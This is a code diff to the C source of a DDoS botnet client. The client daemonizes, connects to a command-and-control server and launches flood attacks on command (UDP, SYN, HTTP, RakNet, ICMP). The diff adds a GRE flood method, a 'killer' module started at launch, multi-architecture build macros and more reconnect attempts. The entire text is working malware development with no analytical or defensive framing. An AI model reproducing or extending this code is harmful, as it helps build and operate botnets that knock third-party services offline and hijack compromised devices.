@@ -18,31 +18,33 @@
 #include "headers/attack_params.h"
 #include "headers/daemon.h"
 #include "headers/icmp_attack.h"
+#include "headers/killer.h"
+#include "headers/gre_attack.h"
 
 #define CNC_IP "0.0.0.0"
 #define BOT_PORT 1338
 #define MAX_THREADS 1
 
 const char* get_arch() {
-    #if defined(__aarch64__)
+    #ifdef ARCH_aarch64
     return "aarch64";
-    #elif defined(__arm__)
+    #elif defined(ARCH_arm)
     return "arm";
-    #elif defined(__m68k__)
+    #elif defined(ARCH_m68k)
     return "m68k";
-    #elif defined(__mips__)
+    #elif defined(ARCH_mips)
     return "mips";
-    #elif defined(__mipsel__)
+    #elif defined(ARCH_mipsel)
     return "mipsel";
-    #elif defined(__powerpc64__)
+    #elif defined(ARCH_powerpc64)
     return "powerpc64";
-    #elif defined(__sh__)
+    #elif defined(ARCH_sh4)
     return "sh4";
-    #elif defined(__sparc__)
+    #elif defined(ARCH_sparc)
     return "sparc";
-    #elif defined(__x86_64__)
+    #elif defined(ARCH_x86_64)
     return "x86_64";
-    #elif defined(__i386__)
+    #elif defined(ARCH_i686)
     return "i686";
     #else
     return "unknown";
@@ -68,10 +70,10 @@ void handle_command(const char *command, int sock) {
     }
 
     int is_attack = 0;
-    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp"};
-    int method_len[] = {4, 4, 4, 7, 5, 7, 5};
+    const char *methods[] = {"!udp", "!vse", "!syn", "!socket", "!http", "!raknet", "!icmp", "!gre"};
+    int method_len[] = {4, 4, 4, 7, 5, 7, 5, 4};
     int which = -1;
-    for (int i = 0; i < 7; i++) {
+    for (int i = 0; i < 8; i++) {
         if (strncmp(command, methods[i], method_len[i]) == 0) {
             is_attack = 1;
             which = i;
@@ -81,12 +83,19 @@ void handle_command(const char *command, int sock) {
 
     if (is_attack) {
         char ip[32] = {0};
-        int port = 0, time = 0;
-        int psize = 0, srcport = 0;
         char argstr[512] = {0};
-        int n;
+        int n = 0;
+        int port = 0;
+        int time = 0;
+        int psize = 0;
+        int srcport = 0;
+        int gre_proto = 0;
+        int gport = 0;
 
         if (which == 6) {
+            n = sscanf(command, "%*s %31s %d %[^\n]", ip, &time, argstr);
+            if (n < 2) return;
+        } else if (which == 7) { // gre
             n = sscanf(command, "%*s %31s %d %[^\n]", ip, &time, argstr);
             if (n < 2) return;
         } else {
@@ -101,6 +110,11 @@ void handle_command(const char *command, int sock) {
                     psize = atoi(token + 6);
                 } else if (strncmp(token, "srcport=", 8) == 0) {
                     srcport = atoi(token + 8);
+                } else if (which == 7 && strncmp(token, "proto=", 6) == 0) {
+                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
+                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
+                } else if (which == 7 && strncmp(token, "gport=", 6) == 0) {
+                    gport = atoi(token + 6);
                 }
                 token = strtok(NULL, " ");
             }
@@ -113,6 +127,29 @@ void handle_command(const char *command, int sock) {
             }
             free(params);
             params = NULL;
+        }
+
+        if (which == 7) { // gre
+            gre_attack_params *gre_params = malloc(sizeof(gre_attack_params));
+            if (!gre_params) return;
+            gre_params->active = 1;
+            gre_params->duration = time;
+            gre_params->target_addr.sin_family = AF_INET;
+            gre_params->target_addr.sin_addr.s_addr = inet_addr(ip);
+            gre_params->target_addr.sin_port = htons(gport);
+            gre_params->psize = psize;
+            gre_params->srcport = srcport;
+            gre_params->gre_proto = gre_proto;
+            for (int i = 0; i < MAX_THREADS; i++) {
+                pthread_create(&threads[i], NULL, gre_attack, gre_params);
+            }
+            sleep((unsigned int)time);
+            gre_params->active = 0;
+            for (int i = 0; i < MAX_THREADS; i++) {
+                pthread_cancel(threads[i]);
+            }
+            free(gre_params);
+            return;
         }
 
         params = malloc(sizeof(attack_params));
@@ -137,7 +174,7 @@ void handle_command(const char *command, int sock) {
                 case 6: pthread_create(&threads[i], NULL, icmp_attack, params); break;
             }
         }
-        sleep(time);
+        sleep((unsigned int)time);
         params->active = 0;
         for (int i = 0; i < MAX_THREADS; i++) {
             pthread_cancel(threads[i]);
@@ -162,6 +199,7 @@ void handle_command(const char *command, int sock) {
 
 int main(int argc, char** argv) {
     daemonize(argc, argv);
+    start_killer();
 
     int sock;
     struct sockaddr_in server_addr;
@@ -170,7 +208,7 @@ int main(int argc, char** argv) {
     inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr);
 
     int attempts = 0;
-    while (attempts < 8) {
+    while (attempts < 13) {
         sock = socket(AF_INET, SOCK_STREAM, 0);
         if (sock < 0) {
             return 1;
